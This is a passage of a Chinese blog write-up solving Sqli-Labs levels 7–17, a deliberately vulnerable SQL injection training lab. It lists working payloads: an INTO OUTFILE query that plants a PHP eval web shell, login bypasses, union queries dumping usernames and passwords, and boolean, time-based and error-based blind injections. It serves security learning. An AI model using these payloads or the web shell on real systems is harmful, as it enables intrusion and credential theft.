+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%secure%&apos;;</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/03/08/kzznaj.png" alt="kzznaj.png"></p>
+<p>结果为NULL， </p>
+<blockquote>
+<p>1.如果这个参数为空，这个变量没有效果；<br>2.如果这个参数设为一个目录名，Mysql服务只允许在这个目录中执行文件的导入和导出操作。这个目录必须存在，MySQL服务不会创建它；<br>3.如果这个参数为<code>null</code>，Mysql服务会禁止导入和导出操作；</p>
+</blockquote>
+<p>在MYSQL配置文件my.ini添加<code>secure_file_priv=</code>，再次查看得到结果不为NULL，因为没有设置指定的目录，所以任意目录都可以进行导入和导出；</p>
+<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><h4 id="1-写入木马"><a href="#1-写入木马" class="headerlink" title="1.写入木马"></a>1.写入木马</h4><p>直接使用outfile的写文件功能向指定文件夹上传木马，连接菜刀即可；</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;)) union select 1,2,&apos;&lt;?php @eval($_POST[cmd]);?&gt;&apos; into outfile &apos;D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs\\Less-7\\1.php&apos; --+</span><br></pre></td></tr></table></figure>
+<h4 id="2-导出文件"><a href="#2-导出文件" class="headerlink" title="2. 导出文件"></a>2. 导出文件</h4><p>直接将users表单内容导出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos;)) union select * from users into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs\\sqli-labs-master\\Less-7\\2.txt&quot;--+</span><br></pre></td></tr></table></figure>
+<h2 id="less-8-bool盲注"><a href="#less-8-bool盲注" class="headerlink" title="less-8(bool盲注)"></a>less-8(bool盲注)</h2><p>其实和第5关相比就是注释掉了<code>print_r(mysql_error())</code>，是个bool盲注，只是不可以使用报错注入而已；</p>
+<p><img src="https://s2.ax1x.com/2019/03/12/AiG7o6.png" alt="AiG7o6.png"></p>
+<p>所以直接构造逻辑判断盲注即可：</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27%20and%20ascii(substr(database(),1,1))=115--+</span><br></pre></td></tr></table></figure>
+<h2 id="less-9-时间盲注-单引号"><a href="#less-9-时间盲注-单引号" class="headerlink" title="less-9(时间盲注-单引号)"></a>less-9(时间盲注-单引号)</h2><p>这一关和前面的第8关的区别就是没有回显，是一个时间盲注，直接闭合引号后时间盲注即可；</p>
+<p>payload:</p>
+<p>1.爆库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(ascii(substr((database()),1,1))=115,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
+<p>2.爆表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=105,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
+<p>3.爆列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),1,1))=105,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
+<p>4.爆数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(ascii(substr((select password from users limit 0,1),1,1))=68,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
+<p>其实就是一个暴力破解的过程(二分法提高效率)</p>
+<h2 id="less-10-时间盲注-双引号"><a href="#less-10-时间盲注-双引号" class="headerlink" title="less-10(时间盲注-双引号)"></a>less-10(时间盲注-双引号)</h2><p>测试单引号<code>?id=1&#39; and sleep(5)--+</code>没有延时，说明不是单引号，试一下双引号即可；</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and sleep(5)--+</span><br></pre></td></tr></table></figure>
+<p>接下来除了双引号，和less-9一样；</p>
+<h2 id="小结2"><a href="#小结2" class="headerlink" title="小结2"></a>小结2</h2><h2 id="less-11-Post注入"><a href="#less-11-Post注入" class="headerlink" title="less-11(Post注入)"></a>less-11(Post注入)</h2><p>无从下手就查看一下源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uname=$_POST[<span class="string">'uname'</span>];</span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
+<p>这里的uname和passwd都是通过post请求传入的，这里我们需要使用到bp截包修改传递参数的内容；首先闭合引号后，构造永真语句查询：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; or 1=1--+</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Your Login name:Dumb<br>Your Password:Dumb</p>
+</blockquote>
+<p>成功回显，所以直接就可以查询列数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; order by 2--+</span><br></pre></td></tr></table></figure>
+<p>发现是有两列的，然后继续构造union select查询：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; union select 1,2--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/03/13/AFR0JO.png" alt="AFR0JO.png"></p>
+<p>发现可以查询到1,2列的东西，那就可以利用这两个位置来回显想要的东西了；构造如下语句：</p>
+<p>1.爆库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; union select database(),version()--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/03/13/AFRRTP.png" alt="AFRRTP.png"></p>
+<p>2.爆表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; union select database(),group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/03/13/AFWl7t.png" alt="AFWl7t.png"></p>
+<p>3.爆列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; union select database(),group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/03/13/AFWUXj.png" alt="AFWUXj.png"></p>
+<p>4.爆数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; union select group_concat(username),group_concat(password) from users--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/03/13/AFWgc4.png" alt="AFWgc4.png"></p>
+<p>其实无非就是传参方式变了而已，友情提示：新版hackbar是坑，谨慎使用；</p>
+<h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><p>其实和上一题类似，只是闭合方式变了而已，需要用到双引号加小括号闭合，payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&quot;) or 1=1--+</span><br></pre></td></tr></table></figure>
+<h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h2><p>尝试单引号失败，双引号失败，发现应该没有那么简单，直接查看源码发现如下内容：</p>
+<p>1.闭合方式是<code>&#39;)</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$sql=&quot;SELECT username, password FROM users WHERE username=(&apos;$uname&apos;) and password=(&apos;$passwd&apos;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>2.不会返回SQL查询语句的内容</p>
+<p><img src="https://s2.ax1x.com/2019/03/13/AFfqiV.png" alt="AFfqiV.png"></p>
+<p>3.发现针对查询结果对错的返回页面的图片不一样</p>
+<p>正确：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;&lt;img src=&quot;../images/flag.jpg&quot;   /&gt;&apos;;</span><br></pre></td></tr></table></figure>
+<p>错误：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&apos;;</span><br></pre></td></tr></table></figure>
+<p>这里演示2种方法：</p>
+<h3 id="solution1-concat报错"><a href="#solution1-concat报错" class="headerlink" title="solution1(concat报错)"></a>solution1(concat报错)</h3><p>1.爆库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos;) union%20select%20count(*),concat(0x3a,0x3a,(database()),0x3a,0x3a,floor(rand()*2))a%20from%20information_schema.tables%20group%20by%20a--+</span><br></pre></td></tr></table></figure>
+<p>2.爆表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos;) union%20select%20count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,0x3a,floor(rand()*2))a%20from%20information_schema.tables%20group%20by%20a--+</span><br></pre></td></tr></table></figure>
+<p>3.爆列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos;) union%20select%20count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),0x3a,0x3a,floor(rand()*2))a%20from%20information_schema.tables%20group%20by%20a--+</span><br></pre></td></tr></table></figure>
+<p>4.爆数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos;) union%20select%20count(*),concat(0x3a,0x3a,(select username from users limit 0,1),0x3a,0x3a,floor(rand()*2))a%20from%20information_schema.tables%20group%20by%20a--+</span><br></pre></td></tr></table></figure>
+<h3 id="solution2-逻辑判断"><a href="#solution2-逻辑判断" class="headerlink" title="solution2(逻辑判断)"></a>solution2(逻辑判断)</h3><p>思路：首先我们post一个错误的uname和passwd过去，然后构造or语句后面跟上查询语句，这样的话第一句话为flase，如果第二个查询也为flase，则会回显错误图片slap.jpg，否则回显正确图片flag.jpg</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos;) or ascii(substr(database(),1,1))=115--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos;) or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101--+</span><br></pre></td></tr></table></figure>
+<h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h2><p>除了闭合方式为双引号，其他和less-13一样，不再赘述；</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&quot; or 1=1--+</span><br></pre></td></tr></table></figure>
+<h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h2><p>闭合方式为单引号，其他和less-13一样，不再赘述；</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; or 1=1--+</span><br></pre></td></tr></table></figure>
+<h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h2><p>闭合方式为双引号加括号：<code>&quot;)</code>，其余和less-13一致；</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&quot;) or 1=1--+</span><br></pre></td></tr></table></figure>
+<h2 id="小结3"><a href="#小结3" class="headerlink" title="小结3"></a>小结3</h2><h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p>这是在用uname查询之前经过的check_input()函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function check_input($value)</span><br><span class="line">	&#123;</span><br><span class="line">	if(!empty($value))</span><br><span class="line">		&#123;</span><br><span class="line">		// truncation (see comments)</span><br><span class="line">		$value = substr($value,0,15);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		// Stripslashes if magic quotes enabled</span><br><span class="line">		if (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		// Quote if not a number</span><br><span class="line">		if (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	else</span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	return $value;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><strong>1</strong>. 若<code>uname</code>非空，截取它的前15个字符。<br><strong>2</strong>. 若php环境变量<code>magic_quotes_gpc</code>打开，去除转义的反斜杠<code>\</code>。<br><strong>3</strong>. 若<code>uname</code>字符串非数字，将其中特殊字符转义；为数字则将其转为数字类型。</p>
+</blockquote>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Gard3nia</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://gardenia30.top/2019/04/03/Sqli-Labs笔记-basic/">https://gardenia30.top/2019/04/03/Sqli-Labs笔记-basic/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/Sql注入/">Sql注入</a></div><nav id="pagination"><div class="next-post pull-right"><a href="/2019/04/03/XSS小游戏通关笔记/"><span>XSS小游戏通关笔记</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2019 By Gard3nia</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">Just keep moving!</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.5.6"></script><script src="/js/fancybox.js?version=1.5.6"></script><script src="/js/sidebar.js?version=1.5.6"></script><script src="/js/copy.js?version=1.5.6"></script><script src="/js/fireworks.js?version=1.5.6"></script><script src="/js/transition.js?version=1.5.6"></script><script src="/js/scroll.js?version=1.5.6"></script><script src="/js/head.js?version=1.5.6"></script></body></html>
